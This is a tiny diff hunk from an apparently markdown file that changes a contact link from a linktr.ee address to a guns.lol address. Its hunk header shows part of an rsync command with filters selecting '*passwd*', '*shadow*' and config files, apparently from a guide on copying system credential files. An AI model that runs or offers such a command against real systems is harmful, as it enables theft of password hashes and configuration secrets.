@@ -161,4 +161,4 @@ rsync -avz --include="*passwd*" --include="*shadow*" --include="*config*" \
   cd /
   ```
 
-Reach out: https://linktr.ee/january1073
+Reach out: https://guns.lol/january1073
